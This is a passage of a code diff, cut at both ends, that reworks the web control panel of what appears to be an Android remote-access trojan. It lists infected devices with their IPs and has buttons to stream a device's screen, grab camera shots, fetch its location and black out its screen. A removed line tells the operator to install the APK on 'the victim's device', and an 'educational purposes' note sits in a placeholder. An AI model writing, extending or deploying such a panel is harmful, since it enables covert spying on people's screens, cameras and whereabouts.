+        <div class="stat-info">
+          <div class="label">Offline</div>
+          <div class="num">{{ offline }}</div>
+          <div class="trend down" id="offlineTrend">↓ {{ offline }}</div>
+        </div>
+      </div>
+      <div class="stat-card yellow">
+        <div class="stat-icon">⚠️</div>
+        <div class="stat-info">
+          <div class="label">Alerts</div>
+          <div class="num" id="alertsNum">0</div>
+          <div class="trend up">يحتاج انتباه</div>
+        </div>
       </div>
     </div>
 
-    <div class="section-title">📱 <span>الأجهزة المتصلة</span><span class="count">{{ total }}</span></div>
+    <!-- MAIN GRID -->
+    <div class="main-grid">
 
-    <div class="device-list">
-      {% if devices %}
-        {% for d in devices %}
-        <div class="device-card {% if d.online %}online{% else %}offline{% endif %}" onclick="selectDevice('{{ d.id }}', this)">
-          <div class="device-left">
-            <div class="device-icon-box">📱</div>
-            <div class="device-info">
-              <div class="device-name">{{ d.model }}</div>
-              <div class="device-meta">
-                <span>🤖 أندرويد {{ d.android }}</span>
-                <span>🔋 {{ d.battery }}%</span>
-                <span>🌐 {{ d.ip }}</span>
-              </div>
+      <!-- Connected Devices -->
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">
+            <span class="icon">💻</span>
+            <span>Connected Devices</span>
+          </div>
+          <a class="panel-action">View All →</a>
+        </div>
+        <div class="panel-body" style="padding: 0 15px;">
+          {% if devices %}
+          <table class="devices-table">
+            <thead>
+              <tr>
+                <th>Device Name</th>
+                <th>OS</th>
+                <th>Status</th>
+                <th>IP</th>
+                <th>Last Seen</th>
+                <th></th>
+              </tr>
+            </thead>
+            <tbody>
+              {% for d in devices %}
+              <tr onclick="selectDevice('{{ d.id }}', this)">
+                <td>
+                  <div style="display: flex; align-items: center; gap: 10px;">
+                    <div class="dev-icon">📱</div>
+                    <div class="dev-info">
+                      <div class="name">{{ d.model }}</div>
+                      <div class="sub">ID: {{ d.id }}</div>
+                    </div>
+                  </div>
+                </td>
+                <td>
+                  <div style="display: flex; align-items: center; gap: 6px; font-size: 11px;">
+                    <span>🤖</span>
+                    <span>Android {{ d.android }}</span>
+                  </div>
+                </td>
+                <td>
+                  <span class="status-tag {% if d.online %}online{% else %}offline{% endif %}">
+                    {% if d.online %}Online{% else %}Offline{% endif %}
+                  </span>
+                </td>
+                <td><span class="loc-ip">{{ d.ip }}</span></td>
+                <td style="font-size: 11px; color: var(--text-dim);">{{ d.last_seen or '--' }}</td>
+                <td style="width: 40px;">
+                  <button class="remove-btn" onclick="removeDevice(event, '{{ d.id }}')">🗑️</button>
+                </td>
+              </tr>
+              {% endfor %}
+            </tbody>
+          </table>
+          {% else %}
+          <div style="text-align: center; padding: 40px 20px; color: var(--text-dim); font-size: 13px;">
+            📭 مافيش أجهزة متصلة حالياً
+          </div>
+          {% endif %}
+        </div>
+      </div>
+
+      <!-- World Map -->
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">
+            <span class="icon">🌍</span>
+            <span>World Map</span>
+          </div>
+          <a class="panel-action">View All →</a>
+        </div>
+        <div class="panel-body">
+          <div id="worldMap"></div>
+          <div class="location-list" id="locationList">
+            <div style="text-align: center; color: var(--text-dim); font-size: 11px; padding: 15px;">
+              لا توجد مواقع متاحة
             </div>
           </div>
-          <div class="status-badge-dev {% if d.online %}status-online{% else %}status-offline{% endif %}">
-            {% if d.online %}متصل{% else %}غير متصل{% endif %}
+        </div>
+      </div>
+
+      <!-- System Status -->
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">
+            <span class="icon">💓</span>
+            <span>System Status</span>
           </div>
         </div>
-        {% endfor %}
-      {% else %}
-        <div class="empty">
-          <div class="big">📭</div>
-          <div>مافيش أجهزة متصلة حالياً</div>
-          <div style="margin-top:10px;font-size:12px;color:#444;">ثبّت APK على جهاز الضحية</div>
+        <div class="panel-body">
+          <div class="sys-item">
+            <div class="sys-label">
+              <div class="name"><span class="icon">🖥️</span> CPU Usage</div>
+              <div class="val" id="cpuVal">0%</div>
+            </div>
+            <div class="progress"><div class="progress-bar" id="cpuBar" style="width: 0%;"></div></div>
+          </div>
+          <div class="sys-item">
+            <div class="sys-label">
+              <div class="name"><span class="icon">🧠</span> RAM Usage</div>
+              <div class="val" id="ramVal">0%</div>
+            </div>
+            <div class="progress"><div class="progress-bar blue" id="ramBar" style="width: 0%;"></div></div>
+          </div>
+          <div class="sys-item">
+            <div class="sys-label">
+              <div class="name"><span class="icon">💾</span> Disk Usage</div>
+              <div class="val" id="diskVal">0%</div>
+            </div>
+            <div class="progress"><div class="progress-bar yellow" id="diskBar" style="width: 0%;"></div></div>
+          </div>
+          <div class="sys-item">
+            <div class="sys-label">
+              <div class="name"><span class="icon">📡</span> Network</div>
+              <div class="val" id="netVal">0 KB/s</div>
+            </div>
+          </div>
         </div>
-      {% endif %}
+      </div>
+
     </div>
 
-    <div class="section-title">⚡ <span>التحكم السريع</span></div>
+    <!-- BOTTOM GRID -->
+    <div class="bottom-grid">
 
-    <div class="controls">
-      <div class="ctrl-btn blue" onclick="startScreen()"><span class="ico">📺</span><span>لايف سكرين</span></div>
-      <div class="ctrl-btn" onclick="cmd('camera')"><span class="ico">📷</span><span>كاميرا</span></div>
-      <div class="ctrl-btn blue" onclick="cmd('location')"><span class="ico">📍</span><span>موقع</span></div>
-      <div class="ctrl-btn red" onclick="cmd('blackout')"><span class="ico">⬛</span><span>شاشة سوداء</span></div>
-      <div class="ctrl-btn green" onclick="cmd('unblackout')"><span class="ico">🔆</span><span>رجّع الشاشة</span></div>
-      <div class="ctrl-btn red" onclick="cmd('stop_screen')"><span class="ico">🛑</span><span>إيقاف اللايف</span></div>
+      <!-- Activity -->
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">
+            <span class="icon">🕐</span>
+            <span>Recent Activity</span>
+          </div>
+          <a class="panel-action">View All →</a>
+        </div>
+        <div class="panel-body" style="padding: 0 15px;">
+          <div class="activity-list" id="activityList">
+            <div style="text-align: center; color: var(--text-dim); font-size: 11px; padding: 15px;">
+              جاري التحميل...
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Network Traffic -->
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">
+            <span class="icon">📊</span>
+            <span>Network Traffic</span>
+          </div>
+        </div>
+        <div class="panel-body">
+          <canvas id="trafficChart"></canvas>
+        </div>
+      </div>
+
+      <!-- Quick Note + Quick Actions -->
+      <div class="panel">
+        <div class="panel-header">
+          <div class="panel-title">
+            <span class="icon">📝</span>
+            <span>Quick Note</span>
+          </div>
+        </div>
+        <div class="panel-body">
+          <div class="note-box">
+            <textarea id="quickNote" placeholder="اكتب ملاحظاتك هنا...">Stay secure. Use only for educational purposes.</textarea>
+          </div>
+          <div style="margin-top: 12px;">
+            <div style="font-size: 10px; color: var(--text-dim); text-align: center; letter-spacing: 1px;">
+              More Control · More Possibilities
+            </div>
+          </div>
+        </div>
+      </div>
+
     </div>
-  </main>
-</div>
 
-<script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
-<script>
-let selectedDevice = null;
-const socket = io();
+    <!-- Quick Actions Row -->
+    <div class="panel" style="margin-top: 12px;">
+      <div class="panel-header">
+        <div class="panel-title">
+          <span class="icon">⚡</span>
+          <span>Quick Actions</span>
+        </div>
+      </div>
+      <div class="panel-body">
+        <div class="quick-actions" style="grid-template-columns: repeat(6, 1fr);">
+          <button class="qa-btn" onclick="startScreen()"><span class="ico">🖥️</span>Screen View</button>
+          <button class="qa-btn" onclick="cmd('camera')"><span class="ico">📷</span>Camera</button>
+          <button class="qa-btn" onclick="cmd('location')"><span class="ico">📍</span>Location</button>
+          <button class="qa-btn" onclick="cmd('blackout')"><span class="ico">⬛</span>Blackout</button>
+          <button class="qa-btn" onclick="cmd('unblackout')"><span class="ico">🔆</span>Restore</button>
+          <button class="qa-btn" onclick="cmd('stop_screen')"><span class="ico">🛑</span>Stop</button>
+        </div>
+      </div>
+    </div>
 
-function updateClock() {
-  const now = new Date();
-  const el = document.getElementById('clock');
-  if (el) el.textContent = String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0');
-}
-setInterval(updateClock, 1000);
-updateClock();
-
-socket.on('devices_update', () => setTimeout(() => location.reload(), 1500));
-
-socket.on('device_response', (data) => {
-  if (data.type === 'camera' && data.image) showImage('data:image/jpeg;base64,' + data.image);
-  if (data.type === 'location') {
-    if (data.lat && (data.lat !== 0 || data.lon !== 0)) showToast('📍 ' + data.lat.toFixed(4) + ', ' + data.lon.toFixed(4), 'success');
-    else showToast('❌ الموقع مش متاح', 'error');
-  }
-});
-
-function toggleMenu() { document.getElementById('sidebar').classList.toggle('open'); }
-
-function selectDevice(id, el) {
-  selectedDevice = id;
-  document.querySelectorAll('.device-card').forEach(c => c.classList.remove('selected'));
-  if (el) el.classList.add('selected');
-  showToast('✅ تم اختيار الجهاز', 'success');
-}
-
-function startScreen() {
-  if (!selectedDevice) { showToast('⚠️ اختر جهاز أولاً', 'error'); return; }
-  try { sessionStorage.setItem('selectedDevice', selectedDevice); } catch(e) {}
-  window.location.href = '/screen';
-}
-
-function cmd(action) {
-  if (!selectedDevice) { showToast('⚠️ اختر جهاز أولاً', 'error'); return; }
-  socket.emit('send_command', { target: selectedDevice, action: action });
-  showToast('📤 أُرسل: ' + action, 'info');
-}
-
-function cmdAndToast(action, icon) {
-  if (!selectedDevice) { showToast('⚠️ اختر جهاز أولاً', 'error'); return; }
-  socket.emit('send_command', { target: selectedDevice, action: action });
-  showToast('📤 ' + icon, 'info');
-}
-
-function showSection(name) {
-  document.getElementById('sidebar').classList.remove('open');
-}
-
-function showImage(src) {
-  const v = document.createElement('div');
-  v.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.95);display:flex;align-items:center;justify-content:center;z-index:10000;cursor:pointer;';
-  const img = document.createElement('img');
-  img.src = src;
-  img.style.cssText = 'max-width:95%;max-height:95%;border:3px solid #ff0033;border-radius:12px;box-shadow:0 0 40px rgba(255,0,51,0.8);';
-  v.appendChild(img);
-  v.onclick = () => v.remove();
-  document.body.appendChild(v);
-}
-
-function showToast(msg, type) {
-  const t = document.createElement('div');
-  t.className = 'toast ' + type;
-  t.textContent = msg;
-  document.body.appendChild(t);
-  setTimeout(() => t.remove(), 3000);
-}
-</script>
-</body>
-</html>
+    <!-- Footer -->
+    <div style="text-align: center; margin-top: 20px; padding: 20px; color: var(--text-dim); font-size: 11px; border-top: 1px solid var(--border);">
+      <div style="font-size: 13px; font-weight: bold; margin-bottom: 8px; letter-spacing:
